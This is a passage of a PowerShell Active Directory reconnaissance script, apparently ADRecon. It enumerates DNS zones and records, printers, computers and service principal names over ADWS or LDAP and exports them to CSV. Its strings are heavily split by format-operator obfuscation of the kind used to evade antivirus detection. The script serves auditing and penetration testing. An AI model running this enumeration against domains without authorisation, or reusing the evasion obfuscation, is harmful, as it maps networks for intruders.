                    $Block = [BitConverter]::ToUInt16($BlockRaw, 0)
			        $AAAA += ($Block).ToString('x4')
			        If ($i -ne 38)
                    {
                        $AAAA += ':'
                    }
                }
                $Data = $AAAA
                $DNSRecordObject | Add-Member Noteproperty ("{2}{0}{3}{1}"-f 'ec','ype','R','ordT') ("{1}{0}"-f 'AAA','A')
            }

            33
            {
                $PriorityRaw = $DNSRecord[24..25]
                # reverse for big endian
                $Null = [array]::Reverse($PriorityRaw)
                $Priority = [BitConverter]::ToUInt16($PriorityRaw, 0)

                $WeightRaw = $DNSRecord[26..27]
                $Null = [array]::Reverse($WeightRaw)
                $Weight = [BitConverter]::ToUInt16($WeightRaw, 0)

                $PortRaw = $DNSRecord[28..29]
                $Null = [array]::Reverse($PortRaw)
                $Port = [BitConverter]::ToUInt16($PortRaw, 0)

                $SRVHost = Get-Name $DNSRecord[30..$DNSRecord.length]
                $Data = "[" + $Priority + "][" + $Weight + "][" + $Port + "][" + $SRVHost + "]"
                $DNSRecordObject | Add-Member Noteproperty ("{3}{2}{0}{1}"-f 'yp','e','ecordT','R') 'SRV'
            }

            default
            {
                $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
                $DNSRecordObject | Add-Member Noteproperty ("{2}{1}{0}"-f'Type','cord','Re') ("{0}{1}"-f 'UNKNOW','N')
            }
        }
        $DNSRecordObject | Add-Member Noteproperty ("{1}{0}{3}{4}{2}"-f'date','Up','l','dAtSe','ria') $UpdatedAtSerial
        $DNSRecordObject | Add-Member Noteproperty 'TTL' $TTL
        $DNSRecordObject | Add-Member Noteproperty 'Age' $Age
        $DNSRecordObject | Add-Member Noteproperty ("{1}{0}{2}" -f'a','TimeSt','mp') $TimeStamp
        $DNSRecordObject | Add-Member Noteproperty ("{1}{0}"-f'a','Dat') $Data
        Return $DNSRecordObject
    }
}

Function Get-ADRDNSZone
{
<#
.SYNOPSIS
    Returns all DNS Zones and Records in the current (or specified) domain.

.DESCRIPTION
    Returns all DNS Zones and Records in the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER DomainController
    [string]
    IP Address of the Domain Controller.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER ADROutputDir
    [string]
    Path for ADRecon output folder.

.PARAMETER OutputType
    [array]
    Output Type.

.PARAMETER ADRDNSZones
    [bool]

.PARAMETER ADRDNSRecords
    [bool]

.OUTPUTS
    CSV files are created in the folder specified with the information.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $false)]
        [string] $DomainController,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $true)]
        [string] $ADROutputDir,

        [Parameter(Mandatory = $true)]
        [array] $OutputType,

        [Parameter(Mandatory = $false)]
        [bool] $ADRDNSZones = $true,

        [Parameter(Mandatory = $false)]
        [bool] $ADRDNSRecords = $false
    )

    If ($Method -eq ("{1}{0}"-f 'WS','AD'))
    {
        Try
        {
            $ADDNSZones = Get-ADObject -LDAPFilter ("{2}{1}{0}{4}{5}{3}"-f'ectClass=d','bj','(o','Zone)','n','s') -Properties Name,whenCreated,whenChanged,usncreated,usnchanged,distinguishedname
        }
        Catch
        {
            Write-Warning ("{0}{1}{7}{10}{9}{2}{4}{14}{8}{5}{13}{12}{3}{6}{11}" -f'[','Get-',' while ',' ','e','ng ','Objec','AD','erati',' Error','RDNSZone]','ts','sZone','dn','num')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }

        $DNSZoneArray = @()
        If ($ADDNSZones)
        {
            $DNSZoneArray += $ADDNSZones
            Remove-Variable ADDNSZones
        }

        Try
        {
            $ADDomain = Get-ADDomain
        }
        Catch
        {
            Write-Warning ("{3}{7}{8}{4}{6}{1}{0}{2}{10}{9}{5}"-f'getting',' ',' ','[G','ADRDNS',' Context','Zone] Error','et','-','in','Doma')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        Try
        {
            $ADDNSZones1 = Get-ADObject -LDAPFilter ("{0}{1}{3}{5}{2}{4}" -f'(obj','ec','dnsZone','tClass',')','=') -SearchBase "DC=DomainDnsZones,$($ADDomain.DistinguishedName)" -Properties Name,whenCreated,whenChanged,usncreated,usnchanged,distinguishedname
        }
        Catch
        {
            Write-Warning "[Get-ADRDNSZone] Error while enumerating DC=DomainDnsZones,$($ADDomain.DistinguishedName) dnsZone Objects "
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }
        If ($ADDNSZones1)
        {
            $DNSZoneArray += $ADDNSZones1
            Remove-Variable ADDNSZones1
        }

        Try
        {
            $ADDNSZones2 = Get-ADObject -LDAPFilter (("{3}{5}{4}{1}{2}{0}"-f'ne)','ss=dns','Zo','(ob','la','jectC')) -SearchBase "DC=ForestDnsZones,DC=$($ADDomain.Forest -replace '\.',',DC=')" -Properties Name,whenCreated,whenChanged,usncreated,usnchanged,distinguishedname
        }
        Catch
        {
            Write-Warning "[Get-ADRDNSZone] Error while enumerating DC=ForestDnsZones,DC=$($ADDomain.Forest -replace '\.',',DC=') dnsZone Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }
        If ($ADDNSZones2)
        {
            $DNSZoneArray += $ADDNSZones2
            Remove-Variable ADDNSZones2
        }

        If ($ADDomain)
        {
            Remove-Variable ADDomain
        }

        Write-Verbose "[*] Total DNS Zones: $([ADRecon.ADWSClass]::ObjectCount($DNSZoneArray)) "

        If ($DNSZoneArray)
        {
            $ADDNSZonesObj = @()
            $ADDNSNodesObj = @()
            $DNSZoneArray | ForEach-Object {
                # Create the object for each instance.
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name Name -Value $([ADRecon.ADWSClass]::CleanString($_.Name))
                Try
                {
                    $DNSNodes = Get-ADObject -SearchBase $($_.DistinguishedName) -LDAPFilter ("{1}{0}{2}{4}{3}{5}{6}" -f'b','(o','jectCla','=d','ss','nsNod','e)') -Properties DistinguishedName,dnsrecord,dNSTombstoned,Name,ProtectedFromAccidentalDeletion,showInAdvancedViewOnly,whenChanged,whenCreated
                }
                Catch
                {
                    Write-Warning "[Get-ADRDNSZone] Error while enumerating $($_.DistinguishedName) dnsNode Objects "
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                }
                If ($DNSNodes)
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name RecordCount -Value $($DNSNodes | Measure-Object | Select-Object -ExpandProperty Count)
                    $DNSNodes | ForEach-Object {
                        $ObjNode = New-Object PSObject
                        $ObjNode | Add-Member -MemberType NoteProperty -Name ZoneName -Value $Obj.Name
                        $ObjNode | Add-Member -MemberType NoteProperty -Name Name -Value $_.Name
                        Try
                        {
                            $DNSRecord = Convert-DNSRecord $_.dnsrecord[0]
                        }
                        Catch
                        {
                            Write-Warning ("{12}{8}{4}{11}{1}{9}{5}{3}{6}{14}{0}{13}{7}{10}{2}"-f'nv','ADR','rd','l','e','e] Error whi','e','g the DNSRec','G','DNSZon','o','t-','[','ertin',' co')
                            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                        }
                        $ObjNode | Add-Member -MemberType NoteProperty -Name RecordType -Value $DNSRecord.RecordType
                        $ObjNode | Add-Member -MemberType NoteProperty -Name Data -Value $DNSRecord.Data
                        $ObjNode | Add-Member -MemberType NoteProperty -Name TTL -Value $DNSRecord.TTL
                        $ObjNode | Add-Member -MemberType NoteProperty -Name Age -Value $DNSRecord.Age
                        $ObjNode | Add-Member -MemberType NoteProperty -Name TimeStamp -Value $DNSRecord.TimeStamp
                        $ObjNode | Add-Member -MemberType NoteProperty -Name UpdatedAtSerial -Value $DNSRecord.UpdatedAtSerial
                        $ObjNode | Add-Member -MemberType NoteProperty -Name whenCreated -Value $_.whenCreated
                        $ObjNode | Add-Member -MemberType NoteProperty -Name whenChanged -Value $_.whenChanged
                        # TO DO LDAP part
                        #$ObjNode | Add-Member -MemberType NoteProperty -Name dNSTombstoned -Value $_.dNSTombstoned
                        #$ObjNode | Add-Member -MemberType NoteProperty -Name ProtectedFromAccidentalDeletion -Value $_.ProtectedFromAccidentalDeletion
                        $ObjNode | Add-Member -MemberType NoteProperty -Name showInAdvancedViewOnly -Value $_.showInAdvancedViewOnly
                        $ObjNode | Add-Member -MemberType NoteProperty -Name DistinguishedName -Value $_.DistinguishedName
                        $ADDNSNodesObj += $ObjNode
                        If ($DNSRecord)
                        {
                            Remove-Variable DNSRecord
                        }
                    }
                }
                Else
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name RecordCount -Value $null
                }
                $Obj | Add-Member -MemberType NoteProperty -Name USNCreated -Value $_.usncreated
                $Obj | Add-Member -MemberType NoteProperty -Name USNChanged -Value $_.usnchanged
                $Obj | Add-Member -MemberType NoteProperty -Name whenCreated -Value $_.whenCreated
                $Obj | Add-Member -MemberType NoteProperty -Name whenChanged -Value $_.whenChanged
                $Obj | Add-Member -MemberType NoteProperty -Name DistinguishedName -Value $_.DistinguishedName
                $ADDNSZonesObj += $Obj
            }
            Write-Verbose "[*] Total DNS Records: $([ADRecon.ADWSClass]::ObjectCount($ADDNSNodesObj)) "
            Remove-Variable DNSZoneArray
        }
    }

    If ($Method -eq ("{0}{1}"-f 'LD','AP'))
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.PropertiesToLoad.AddRange((("{0}{1}"-f 'n','ame'),("{3}{0}{1}{2}" -f 'encrea','t','ed','wh'),("{1}{2}{0}{3}" -f 'a','whenc','h','nged'),("{0}{1}{2}"-f 'u','sncreate','d'),("{0}{3}{1}{2}"-f 'usnc','ng','ed','ha'),("{4}{1}{0}{2}{5}{3}"-f'ting','is','uish','e','d','ednam')))
        $ObjSearcher.Filter = (("{4}{3}{2}{5}{0}{1}"-f'one',')','s','bjectClas','(o','=dnsZ'))
        $ObjSearcher.SearchScope = ("{1}{2}{0}" -f 'e','Sub','tre')

        Try
        {
            $ADDNSZones = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning ("{5}{7}{9}{6}{2}{0}{3}{1}{4}{8}"-f' ','g dnsZone Ob','le','enumeratin','j','[Get-','e] Error whi','ADRDNS','ects','Zon')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }
        $ObjSearcher.dispose()

        $DNSZoneArray = @()
        If ($ADDNSZones)
        {
            $DNSZoneArray += $ADDNSZones
            Remove-Variable ADDNSZones
        }

        $SearchPath = ("{0}{3}{1}{2}" -f'DC=Dom','sZ','ones','ainDn')
        If ($Credential -ne [Management.Automation.PSCredential]::Empty)
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$($SearchPath),$($objDomain.distinguishedName)", $Credential.UserName,$Credential.GetNetworkCredential().Password
        }
        Else
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($SearchPath),$($objDomain.distinguishedName)"
        }
        $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
        $objSearcherPath.Filter = ("{0}{2}{1}{3}" -f '(objectClass=dn','o','sZ','ne)')
        $objSearcherPath.PageSize = $PageSize
        $objSearcherPath.PropertiesToLoad.AddRange((("{0}{1}" -f 'n','ame'),("{2}{0}{1}" -f 'hencreat','ed','w'),("{1}{2}{3}{0}"-f 'nged','when','ch','a'),("{2}{0}{3}{1}"-f'rea','ed','usnc','t'),("{0}{1}{2}"-f'us','nc','hanged'),("{4}{1}{0}{2}{5}{3}" -f'inguis','st','hed','ame','di','n')))
        $objSearcherPath.SearchScope = ("{1}{2}{0}"-f'tree','S','ub')

        Try
        {
            $ADDNSZones1 = $objSearcherPath.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRDNSZone] Error while enumerating $($SearchPath),$($objDomain.distinguishedName) dnsZone Objects. "
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }
        $objSearcherPath.dispose()

        If ($ADDNSZones1)
        {
            $DNSZoneArray += $ADDNSZones1
            Remove-Variable ADDNSZones1
        }

        $SearchPath = ("{1}{4}{0}{2}{3}" -f'ForestDns','D','Z','ones','C=')
        If ($Credential -ne [Management.Automation.PSCredential]::Empty)
        {
            $DomainFQDN = Get-DNtoFQDN($objDomain.distinguishedName)
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(("{0}{1}"-f'D','omain'),$($DomainFQDN),$($Credential.UserName),$($Credential.GetNetworkCredential().password))
            Try
            {
                $ADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            Catch
            {
                Write-Warning ("{2}{8}{1}{4}{11}{10}{0}{9}{3}{6}{5}{7}"-f'om',' Er','[Get','n ','ror','ntex','Co','t','-ADRForest]','ai','ing D',' gett')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
            Remove-Variable DomainContext
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$($SearchPath),DC=$($ADDomain.Forest.Name -replace '\.',',DC=')", $Credential.UserName,$Credential.GetNetworkCredential().Password
        }
        Else
        {
            $ADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($SearchPath),DC=$($ADDomain.Forest.Name -replace '\.',',DC=')"
        }

        $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
        $objSearcherPath.Filter = (("{6}{1}{0}{3}{2}{4}{5}" -f 'e','obj','s','ctClass=dn','Z','one)','('))
        $objSearcherPath.PageSize = $PageSize
        $objSearcherPath.PropertiesToLoad.AddRange((("{0}{1}" -f'n','ame'),("{3}{0}{1}{2}"-f'en','creat','ed','wh'),("{1}{2}{0}{3}" -f 'e','whench','ang','d'),("{0}{2}{1}"-f 'u','ncreated','s'),("{0}{2}{1}{3}" -f'u','ang','snch','ed'),("{4}{0}{3}{1}{2}"-f't','uish','edname','ing','dis')))
        $objSearcherPath.SearchScope = ("{1}{0}"-f'e','Subtre')

        Try
        {
            $ADDNSZones2 = $objSearcherPath.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRDNSZone] Error while enumerating $($SearchPath),DC=$($ADDomain.Forest.Name -replace '\.',',DC=') dnsZone Objects."
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }
        $objSearcherPath.dispose()

        If ($ADDNSZones2)
        {
            $DNSZoneArray += $ADDNSZones2
            Remove-Variable ADDNSZones2
        }

        If($ADDomain)
        {
            Remove-Variable ADDomain
        }

        Write-Verbose "[*] Total DNS Zones: $([ADRecon.LDAPClass]::ObjectCount($DNSZoneArray)) "

        If ($DNSZoneArray)
        {
            $ADDNSZonesObj = @()
            $ADDNSNodesObj = @()
            $DNSZoneArray | ForEach-Object {
                If ($Credential -ne [Management.Automation.PSCredential]::Empty)
                {
                    $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$($_.Properties.distinguishedname)", $Credential.UserName,$Credential.GetNetworkCredential().Password
                }
                Else
                {
                    $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($_.Properties.distinguishedname)"
                }
                $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
                $objSearcherPath.Filter = ("{2}{1}{0}{3}"-f'Class=dnsNo','ject','(ob','de)')
                $objSearcherPath.PageSize = $PageSize
                $objSearcherPath.PropertiesToLoad.AddRange((("{0}{5}{3}{2}{1}{4}"-f'd','a','inguishedn','st','me','i'),("{0}{1}" -f 'dnsrec','ord'),("{1}{0}" -f 'me','na'),"dc",("{2}{4}{1}{0}{5}{3}"-f'ance','inadv','sh','ewonly','ow','dvi'),("{2}{0}{1}"-f 'ge','d','whenchan'),("{0}{3}{1}{2}" -f'w','enc','reated','h')))
                Try
                {
                    $DNSNodes = $objSearcherPath.FindAll()
                }
                Catch
                {
                    Write-Warning "[Get-ADRDNSZone] Error while enumerating $($_.Properties.distinguishedname) dnsNode Objects "
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                }
                $objSearcherPath.dispose()
                Remove-Variable objSearchPath

                # Create the object for each instance.
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name Name -Value $([ADRecon.LDAPClass]::CleanString($_.Properties.name[0]))
                If ($DNSNodes)
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name RecordCount -Value $($DNSNodes | Measure-Object | Select-Object -ExpandProperty Count)
                    $DNSNodes | ForEach-Object {
                        $ObjNode = New-Object PSObject
                        $ObjNode | Add-Member -MemberType NoteProperty -Name ZoneName -Value $Obj.Name
                        $name = ([string] $($_.Properties.name))
                        If (-Not $name)
                        {
                            $name = ([string] $($_.Properties.dc))
                        }
                        $ObjNode | Add-Member -MemberType NoteProperty -Name Name -Value $name
                        Try
                        {
                            $DNSRecord = Convert-DNSRecord $_.Properties.dnsrecord[0]
                        }
                        Catch
                        {
                            Write-Warning ("{3}{4}{5}{11}{8}{9}{1}{6}{10}{0}{2}{7}" -f'c',' while convert','o','[Get-A','DR','DN','ing the DN','rd','o','ne] Error','SRe','SZ')
                            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                        }
                        $ObjNode | Add-Member -MemberType NoteProperty -Name RecordType -Value $DNSRecord.RecordType
                        $ObjNode | Add-Member -MemberType NoteProperty -Name Data -Value $DNSRecord.Data
                        $ObjNode | Add-Member -MemberType NoteProperty -Name TTL -Value $DNSRecord.TTL
                        $ObjNode | Add-Member -MemberType NoteProperty -Name Age -Value $DNSRecord.Age
                        $ObjNode | Add-Member -MemberType NoteProperty -Name TimeStamp -Value $DNSRecord.TimeStamp
                        $ObjNode | Add-Member -MemberType NoteProperty -Name UpdatedAtSerial -Value $DNSRecord.UpdatedAtSerial
                        $ObjNode | Add-Member -MemberType NoteProperty -Name whenCreated -Value ([DateTime] $($_.Properties.whencreated))
                        $ObjNode | Add-Member -MemberType NoteProperty -Name whenChanged -Value ([DateTime] $($_.Properties.whenchanged))
                        # TO DO
                        #$ObjNode | Add-Member -MemberType NoteProperty -Name dNSTombstoned -Value $null
                        #$ObjNode | Add-Member -MemberType NoteProperty -Name ProtectedFromAccidentalDeletion -Value $null
                        $ObjNode | Add-Member -MemberType NoteProperty -Name showInAdvancedViewOnly -Value ([string] $($_.Properties.showinadvancedviewonly))
                        $ObjNode | Add-Member -MemberType NoteProperty -Name DistinguishedName -Value ([string] $($_.Properties.distinguishedname))
                        $ADDNSNodesObj += $ObjNode
                        If ($DNSRecord)
                        {
                            Remove-Variable DNSRecord
                        }
                    }
                }
                Else
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name RecordCount -Value $null
                }
                $Obj | Add-Member -MemberType NoteProperty -Name USNCreated -Value ([string] $($_.Properties.usncreated))
                $Obj | Add-Member -MemberType NoteProperty -Name USNChanged -Value ([string] $($_.Properties.usnchanged))
                $Obj | Add-Member -MemberType NoteProperty -Name whenCreated -Value ([DateTime] $($_.Properties.whencreated))
                $Obj | Add-Member -MemberType NoteProperty -Name whenChanged -Value ([DateTime] $($_.Properties.whenchanged))
                $Obj | Add-Member -MemberType NoteProperty -Name DistinguishedName -Value ([string] $($_.Properties.distinguishedname))
                $ADDNSZonesObj += $Obj
            }
            Write-Verbose "[*] Total DNS Records: $([ADRecon.LDAPClass]::ObjectCount($ADDNSNodesObj)) "
            Remove-Variable DNSZoneArray
        }
    }

    If ($ADDNSZonesObj -and $ADRDNSZones)
    {
        Export-ADR $ADDNSZonesObj $ADROutputDir $OutputType ("{2}{1}{0}"-f 'es','on','DNSZ')
        Remove-Variable ADDNSZonesObj
    }

    If ($ADDNSNodesObj -and $ADRDNSRecords)
    {
        Export-ADR $ADDNSNodesObj $ADROutputDir $OutputType ("{0}{1}{2}" -f 'DN','SNode','s')
        Remove-Variable ADDNSNodesObj
    }
}

Function Get-ADRPrinter
{
<#
.SYNOPSIS
    Returns all printers in the current (or specified) domain.

.DESCRIPTION
    Returns all printers in the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use during processing of objects. Default 10.

.OUTPUTS
    PSObject.
#>

    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10
    )

    If ($Method -eq ("{1}{0}"-f 'DWS','A'))
    {
        Try
        {
            $ADPrinters = @( Get-ADObject -LDAPFilter (("{2}{3}{5}{0}{4}{1}" -f 'pr','tQueue)','(objec','t','in','Category=')) -Properties driverName,driverVersion,Name,portName,printShareName,serverName,url,whenChanged,whenCreated )
        }
        Catch
        {
            Write-Warning ("{1}{6}{7}{10}{17}{3}{16}{12}{8}{13}{0}{14}{5}{11}{4}{2}{9}{15}" -f 'ti','[Get-ADR','c','r w','je',' printQueue O','Pri','nter','r','t','] Er','b','ume','a','ng','s','hile en','ro')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADPrinters)
        {
            Write-Verbose "[*] Total Printers: $([ADRecon.ADWSClass]::ObjectCount($ADPrinters)) "
            $PrintersObj = [ADRecon.ADWSClass]::PrinterParser($ADPrinters, $Threads)
            Remove-Variable ADPrinters
        }
    }

    If ($Method -eq ("{0}{1}"-f'L','DAP'))
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = (("{7}{6}{0}{3}{1}{8}{4}{5}{2}"-f 'e','or','Queue)','ctCateg','ri','nt','obj','(','y=p'))
        $ObjSearcher.SearchScope = ("{1}{0}{2}" -f'bt','Su','ree')

        Try
        {
            $ADPrinters = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning ("{10}{1}{7}{0}{8}{12}{6}{4}{5}{2}{11}{9}{3}"-f '] ','DRPrint',' printQu','bjects',' enumerat','ing','e','er','Erro','e O','[Get-A','eu','r whil')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADPrinters)
        {
            $cnt = $([ADRecon.LDAPClass]::ObjectCount($ADPrinters))
            If ($cnt -ge 1)
            {
                Write-Verbose ('[*'+'] '+'Tot'+'al '+'Printe'+'r'+'s: '+"$cnt")
                $PrintersObj = [ADRecon.LDAPClass]::PrinterParser($ADPrinters, $Threads)
            }
            Remove-Variable ADPrinters
        }
    }

    If ($PrintersObj)
    {
        Return $PrintersObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRComputer
{
<#
.SYNOPSIS
    Returns all computers and/or service principal name (SPN) in the current (or specified) domain.

.DESCRIPTION
    Returns all computers and/or service principal name (SPN) in the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER date
    [DateTime]
    Date when ADRecon was executed.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER DormantTimeSpan
    [int]
    Timespan for Dormant accounts. Default 90 days.

.PARAMTER PassMaxAge
    [int]
    Maximum machine account password age. Default 30 days
    https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/domain-member-maximum-machine-account-password-age

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use during processing of objects. Default 10.

.PARAMETER ADRComputers
    [bool]

.PARAMETER ADRComputerSPNs
    [bool]

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $true)]
        [DateTime] $date,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $true)]
        [int] $DormantTimeSpan = 90,

        [Parameter(Mandatory = $true)]
        [int] $PassMaxAge = 30,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10,

        [Parameter(Mandatory = $false)]
        [int] $ADRComputers = $true,

        [Parameter(Mandatory = $false)]
        [int] $ADRComputerSPNs = $false
    )

    If ($Method -eq ("{0}{1}"-f 'AD','WS'))
    {
        If (!$ADRComputers)
        {
            Try
            {
                $ADComputers = @( Get-ADObject -LDAPFilter ((("{4}{1}{9}{7}{3}{5}{8}{10}{2}{6}{0}" -f '))','(samA','cipalN','805','(&','306','ame=*','countType=','3','c','69)(servicePrin'))) -ResultPageSize $PageSize -Properties Name,servicePrincipalName )
            }
            Catch
            {
                Write-Warning ("{0}{10}{9}{3}{4}{1}{8}{2}{5}{6}{7}"-f '[Get-ADRComputer]','ing C','P','le',' enumerat','N ','Object','s','omputerS','Error whi',' ')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
        }
        Else
        {
            Try
            {
                $ADComputers = @( Get-ADComputer -Filter * -ResultPageSize $PageSize -Properties Description,DistinguishedName,DNSHostName,Enabled,IPv4Address,LastLogonDate,("{4}{5}{0}{3}{1}{2}" -f'e','ToDelegate','To','d','msD','S-Allow'),("{0}{1}{3}{2}" -f 'ms-d','s','Sid','-Creator'),("{2}{0}{4}{3}{1}{5}" -f'S-Suppo','rypti','msD','dEnc','rte','onTypes'),Name,OperatingSystem,OperatingSystemHotfix,OperatingSystemServicePack,OperatingSystemVersion,PasswordLastSet,primaryGroupID,SamAccountName,servicePrincipalName,SID,SIDHistory,TrustedForDelegation,TrustedToAuthForDelegation,UserAccountControl,whenChanged,whenCreated )
            }
            Catch
            {
                Write-Warning ("{5}{4}{8}{6}{7}{9}{3}{1}{2}{0}"-f 'ts','mp','uter Objec','enumerating Co','RComputer]','[Get-AD','r wh','ile',' Erro',' ')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
        }
        If ($ADComputers)
        {
            Write-Verbose "[*] Total Computers: $([ADRecon.ADWSClass]::ObjectCount($ADComputers)) "
            If ($ADRComputers)
            {
                $ComputerObj = [ADRecon.ADWSClass]::ComputerParser($ADComputers, $date, $DormantTimeSpan, $PassMaxAge, $Threads)
            }
            If ($ADRComputerSPNs)
            {
                $ComputerSPNObj = [ADRecon.ADWSClass]::ComputerSPNParser($ADComputers, $Threads)
            }
            Remove-Variable ADComputers
        }
    }

    If ($Method -eq ("{1}{0}" -f 'AP','LD'))
    {
        If (!$ADRComputers)
        {
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
            $ObjSearcher.PageSize = $PageSize
            $ObjSearcher.Filter = (("{1}{0}{4}{13}{14}{11}{12}{8}{2}{15}{7}{9}{10}{6}{5}{3}" -f'cc','(&(samA','vic','e=*))','o','lNam','a','Pri',')(ser','nc','ip','30636','9','untType','=805','e'))
            $ObjSearcher.PropertiesToLoad.AddRange((("{1}{0}" -f 'e','nam'),("{1}{3}{4}{2}{0}"-f 'me','service','a','pr','incipaln')))
            $ObjSearcher.SearchScope = ("{1}{0}"-f'btree','Su')
            Try
            {
                $ADComputers = $ObjSearcher.FindAll()
            }
            Catch
            {
                Write-Warning ("{9}{5}{6}{1}{10}{0}{3}{8}{11}{12}{4}{7}{2}" -f 'at',' enum','s','in',' Objec',' Error wh','ile','t','g C','[Get-ADRComputer]','er','omp','uterSPN')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
            $ObjSearcher.dispose()
        }
        Else
        {
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
            $ObjSearcher.PageSize = $PageSize
            $ObjSearcher.Filter = (("{7}{5}{1}{0}{2}{3}{4}{6}"-f'cc','mA','ountType','=','80530','sa','6369)','('))
